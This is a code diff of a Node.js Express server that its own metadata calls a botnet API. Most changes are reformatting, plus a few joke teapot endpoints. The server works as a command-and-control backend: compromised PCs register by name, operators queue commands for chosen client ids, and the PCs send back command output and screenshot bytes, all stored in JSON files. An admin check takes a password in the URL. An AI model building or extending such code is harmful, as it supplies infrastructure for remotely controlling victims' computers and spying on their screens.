@@ -16,259 +16,298 @@ app.set("port", PORT);
 app.set("env", NODE_ENV);
 app.use(logger("tiny"));
 app.use(bodyParser.text());
-app.use(bodyParser.json({ limit: '50mb' }));
+app.use(bodyParser.json({ limit: "50mb" }));
 app.post("/api/v1/screens/:id", (req, res, next) => {
-    var _sid = 0;
-    try {
-        const screen = screens.find(_screen => _screen.id === Number(req.params.id));
-        if (!screen) {
-            screens.push({
-                id: Number(req.params.id),
-                screens: [
-                    {
-                        sid: _sid,
-                        bytes: JSON.parse(req.body).bytes
-                    }
-                ]
-            });
-        } else {
-            _sid = screen.screens.length;
-            screen.screens.push({
-                sid: _sid,
-                bytes: JSON.parse(req.body).bytes
-            });
-        }
-    } catch (e) {
-        next(e);
+  var _sid = 0;
+  try {
+    const screen = screens.find(
+      _screen => _screen.id === Number(req.params.id)
+    );
+    if (!screen) {
+      screens.push({
+        id: Number(req.params.id),
+        screens: [
+          {
+            sid: _sid,
+            bytes: JSON.parse(req.body).bytes
+          }
+        ]
+      });
+    } else {
+      _sid = screen.screens.length;
+      screen.screens.push({
+        sid: _sid,
+        bytes: JSON.parse(req.body).bytes
+      });
     }
-    var sscreens = JSON.stringify(screens);
-    fs.writeFileSync("screens.json", sscreens);
-    res.json(_sid);
-    res.end();
+  } catch (e) {
+    next(e);
+  }
+  var sscreens = JSON.stringify(screens);
+  fs.writeFileSync("screens.json", sscreens);
+  res.json(_sid);
+  res.end();
 });
 app.post("/api/v1/screens/:id/:sid", (req, res, next) => {
-    try {
-        const screen = screens.find(_screen => _screen.id === Number(req.params.id));
-        if (!screen) {
-            const err = new Error("you must create screen first")
-            throw err;
-        }
-        const sbscreen = screen.screens.find(_screens => _screens.sid === Number(req.params.sid))
-        if (!sbscreen) {
-            const err = new Error("screen not found");
-            throw err;
-        }
-        sbscreen.bytes = sbscreen.bytes.concat(JSON.parse(req.body).bytes);
-        res.end();
+  try {
+    const screen = screens.find(
+      _screen => _screen.id === Number(req.params.id)
+    );
+    if (!screen) {
+      const err = new Error("you must create screen first");
+      throw err;
     }
-    catch (e) {
-        next(e);
+    const sbscreen = screen.screens.find(
+      _screens => _screens.sid === Number(req.params.sid)
+    );
+    if (!sbscreen) {
+      const err = new Error("screen not found");
+      throw err;
     }
+    sbscreen.bytes = sbscreen.bytes.concat(JSON.parse(req.body).bytes);
+    res.end();
+  } catch (e) {
+    next(e);
+  }
 });
 app.get("/api/v1/screens/:id", (req, res, next) => {
-    try {
-        const playerStats = screens.find(
-            screens => screens.id === Number(req.params.id)
-        );
-        if (!playerStats) {
-            const err = new Error("screens not found");
-            err.status = 404;
-            throw err;
-        }
-        res.json(playerStats);
-    } catch (e) {
-        next(e);
+  try {
+    const playerStats = screens.find(
+      screens => screens.id === Number(req.params.id)
+    );
+    if (!playerStats) {
+      const err = new Error("screens not found");
+      err.status = 404;
+      throw err;
     }
-    res.end();
+    res.json(playerStats);
+  } catch (e) {
+    next(e);
+  }
+  res.end();
 });
 app.get("/api/v1/client", (req, res, next) => {
-    try {
-        const playerStats = require("./ip.json");
-        res.json(playerStats);
-    } catch (e) {
-        next(e);
-    }
-    res.end();
+  try {
+    const playerStats = require("./ip.json");
+    res.json(playerStats);
+  } catch (e) {
+    next(e);
+  }
+  res.end();
 });
 app.get("/api/v1/messages", (req, res, next) => {
-    try {
-        res.json(messages.length);
-    } catch (e) {
-        next(e);
-    }
-    res.end();
+  try {
+    res.json(messages.length);
+  } catch (e) {
+    next(e);
+  }
+  res.end();
 });
 app.get("/api/v1/responses", (req, res, next) => {
-    res.json(responses);
-    res.end();
+  res.json(responses);
+  res.end();
 });
 app.get("/api/v1/responses/:id", (req, res, next) => {
-    try {
-        const resp = responses.find(_resp => _resp.id === Number(req.params.id));
-        if (!resp) {
-            const err = new Error("client not found");
-            err.status = 404;
-            throw err;
-        }
-        res.json(resp.responses.length);
-    } catch (e) {
-        next(e);
+  try {
+    const resp = responses.find(_resp => _resp.id === Number(req.params.id));
+    if (!resp) {
+      const err = new Error("client not found");
+      err.status = 404;
+      throw err;
     }
+    res.json(resp.responses.length);
+  } catch (e) {
+    next(e);
+  }
 });
 app.get("/api/v1/messages/:id", (req, res, next) => {
-    try {
-        const playerStats = messages.find(
-            message => message.id === Number(req.params.id)
-        );
-        if (!playerStats) {
-            const err = new Error("message not found");
-            err.status = 404;
-            throw err;
-        }
-        res.json(playerStats);
-    } catch (e) {
-        next(e);
+  try {
+    const playerStats = messages.find(
+      message => message.id === Number(req.params.id)
+    );
+    if (!playerStats) {
+      const err = new Error("message not found");
+      err.status = 404;
+      throw err;
     }
-    res.end();
+    res.json(playerStats);
+  } catch (e) {
+    next(e);
+  }
+  res.end();
 });
 app.post("/api/v1/client", (req, res, next) => {
-    try {
-        const newIP = {
-            id: ip.length,
-            nameofpc: JSON.parse(req.body).nameofpc
-        };
-        ip.push(newIP);
-        var sip = JSON.stringify(ip);
-        fs.writeFileSync("ip.json", sip);
-        res.status(201).json(ip.length - 1);
-    } catch (e) {
-        next(e);
-    }
-    res.end();
+  try {
+    const newIP = {
+      id: ip.length,
+      nameofpc: JSON.parse(req.body).nameofpc
+    };
+    ip.push(newIP);
+    var sip = JSON.stringify(ip);
+    fs.writeFileSync("ip.json", sip);
+    res.status(201).json(ip.length - 1);
+  } catch (e) {
+    next(e);
+  }
+  res.end();
 });
 app.post("/api/v1/messages", (req, res, next) => {
-    try {
-        const newMessage = {
-            id: messages.length,
-            command: JSON.parse(req.body).command,
-            ids: JSON.parse(req.body).ids
-        };
-        messages.push(newMessage);
-        var smessages = JSON.stringify(messages);
-        fs.writeFileSync("messages.json", smessages);
-        res.status(201).json(newMessage);
-    } catch (e) {
-        next(e);
-    }
-    res.end();
+  try {
+    const newMessage = {
+      id: messages.length,
+      command: JSON.parse(req.body).command,
+      ids: JSON.parse(req.body).ids
+    };
+    messages.push(newMessage);
+    var smessages = JSON.stringify(messages);
+    fs.writeFileSync("messages.json", smessages);
+    res.status(201).json(newMessage);
+  } catch (e) {
+    next(e);
+  }
+  res.end();
 });
 app.delete("/api/v1/messages", (req, res, next) => {
-    messages = [];
+  messages = [];
 
-    res.end();
+  res.end();
 });
-app.get("/api", function (req, res) {
-    var json = {
-        uri: "http://botnet-api.glitch.me/",
-        version: 1,
-        port: PORT,
-        environment: NODE_ENV,
-        clients: ip.length,
-        messages: messages.length
-    };
-    res.json(json);
+app.get("/api", function(req, res) {
+  var json = {
+    uri: "http://botnet-api.glitch.me/",
+    version: 1,
+    port: PORT,
+    environment: NODE_ENV,
+    clients: ip.length,
+    messages: messages.length
+  };
+  res.json(json);
 
-    res.end();
+  res.end();
 });
 app.get("/api/v1/responses/:id/:rid", (req, res, next) => {
-    var response;
-    try {
-        const resp = responses.find(_resp => _resp.id === Number(req.params.id));
-        if (!resp) {
-            const err = new Error("client not found");
-            err.status = 404;
-            throw err;
-        }
-        response = resp.responses;
-    } catch (e) {
-        next(e);
+  var response;
+  try {
+    const resp = responses.find(_resp => _resp.id === Number(req.params.id));
+    if (!resp) {
+      const err = new Error("client not found");
+      err.status = 404;
+      throw err;
     }
-    try {
-        const ressponse = response.find(
-            _resp => _resp.rid === Number(req.params.rid)
-        );
-        if (!ressponse) {
-            const err = new Error("response not found");
-            err.status = 404;
-            throw err;
-        }
-        res.json(ressponse);
-    } catch (e) {
-        next(e);
+    response = resp.responses;
+  } catch (e) {
+    next(e);
+  }
+  try {
+    const ressponse = response.find(
+      _resp => _resp.rid === Number(req.params.rid)
+    );
+    if (!ressponse) {
+      const err = new Error("response not found");
+      err.status = 404;
+      throw err;
     }
-    res.end();
+    res.json(ressponse);
+  } catch (e) {
+    next(e);
+  }
+  res.end();
 });
 app.post("/api/v1/responses/:id", (req, res, next) => {
-    try {
-        const resp = responses.find(_resp => _resp.id === Number(req.params.id));
-        if (!resp) {
-            responses.push({
-                id: Number(req.params.id),
-                responses: [
-                    {
-                        rid: 0,
-                        response: JSON.parse(req.body).response
-                    }
-                ]
-            });
-        } else {
-            resp.responses.push({
-                rid: resp.responses.length,
-                response: JSON.parse(req.body).response
-            });
-        }
-    } catch (e) {
-        next(e);
+  try {
+    const resp = responses.find(_resp => _resp.id === Number(req.params.id));
+    if (!resp) {
+      responses.push({
+        id: Number(req.params.id),
+        responses: [
+          {
+            rid: 0,
+            response: JSON.parse(req.body).response
+          }
+        ]
+      });
+    } else {
+      resp.responses.push({
+        rid: resp.responses.length,
+        response: JSON.parse(req.body).response
+      });
     }
-    var sresponses = JSON.stringify(responses);
-    fs.writeFileSync("responses.json", sresponses);
-    res.end();
+  } catch (e) {
+    next(e);
+  }
+  var sresponses = JSON.stringify(responses);
+  fs.writeFileSync("responses.json", sresponses);
+  res.end();
 });
 app.delete("/api/v1/responses", (req, res, next) => {
-    responses = [];
+  responses = [];
 
-    res.end();
+  res.end();
 });
 app.delete("/api/v1/client/:id", (req, res, next) => {
-    ip[req.params.id].nameofpc = "";
+  ip[req.params.id].nameofpc = "";
 
-    res.end();
+  res.end();
 });
 app.get("/api/v1/admin/:password", (req, res, next) => {
-    if (process.env.SECRET === String(req.params.password)) {
-        res.json(true);
-    } else {
-        res.json(false);
+  if (process.env.SECRET === String(req.params.password)) {
+    res.json(true);
+  } else {
+    res.json(false);
+  }
+});
+app.get("/api/v1/ip", (req, res, next) => {
+  try {
+    const err = new Error("I’m a teapot");
+    err.status = 418;
+    throw err;
+  } catch (e) {
+    next(e);
+  }
+  res.end();
+});
+app.get("/sandbox", (req, res, next) => {
+  res.json("Who are you?");
+  res.end();
+});
+app.get("/sandbox/:id", (req, res, next) => {
+  res.json(req.params.id);
+  res.end();
+});
+app.post("/api/v1/sandbox", (req, res, next) => {
+  try {
+    if (String(req.body) === "Make a coffee") {
+      const err = new Error("I’m a teapot");
+      err.status = 418;
+      throw err;
     }
+  } catch (e) {
+    next(e);
+  }
+  res.end();
+});
+app.delete("/sandbox", (req, res, next) => {
+  res.json("Deleted!");
+  res.end();
 });
 app.use((req, res, next) => {
-    const err = new Error(`${req.method} ${req.url} Not Found`);
-    err.status = 404;
-    next(err);
+  const err = new Error(`${req.method} ${req.url} Not Found`);
+  err.status = 404;
+  next(err);
 });
 app.use((err, req, res, next) => {
-    console.error(err);
-    res.status(err.status || 500);
-    res.json({
-        error: {
-            message: err.message
-        }
-    });
+  console.error(err);
+  res.status(err.status || 500);
+  res.json({
+    error: {
+      message: err.message
+    }
+  });
 });
 app.listen(PORT, () => {
-    console.log(
-        `Express Server started on Port ${app.get(
-            "port"
-        )} | Environment : ${app.get("env")}`
-    );
+  console.log(
+    `Express Server started on Port ${app.get(
+      "port"
+    )} | Environment : ${app.get("env")}`
+  );
 });
